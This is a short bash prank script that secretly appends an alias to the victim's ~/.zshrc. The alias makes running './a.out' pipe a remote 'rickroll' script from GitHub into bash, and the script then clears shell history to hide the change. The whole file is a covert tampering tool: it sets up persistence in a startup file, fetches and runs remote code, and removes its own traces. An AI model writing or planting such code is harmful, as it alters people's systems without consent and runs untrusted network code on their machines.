#!/bin/bash

echo >> ~/.zshrc
echo "alias ./a.out='curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash && ./a.out $1'" >> ~/.zshrc
history -c
